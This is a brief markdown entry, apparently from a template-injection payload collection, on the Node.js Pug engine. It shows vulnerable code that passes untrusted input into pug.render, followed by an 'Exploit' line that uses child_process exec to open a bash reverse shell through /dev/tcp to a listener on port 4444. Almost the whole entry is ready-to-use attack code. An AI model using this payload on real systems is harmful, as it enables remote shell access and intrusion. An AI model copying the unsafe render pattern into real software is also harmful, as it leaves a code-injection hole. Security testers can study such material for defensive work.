# NodeJs pug

## Installation

`$ npm install pug`

## Vulnerable Source

```nodejs
pug = require('pug');
pug.render('#{<code-here>}');

// or 

pug.render('title= <code-here>');
```

## Exploit

```nodejs
require("child_process").exec("bash -c \\"bash -i >& /dev/tcp/127.0.0.1/4444 0>&1\\"")
```

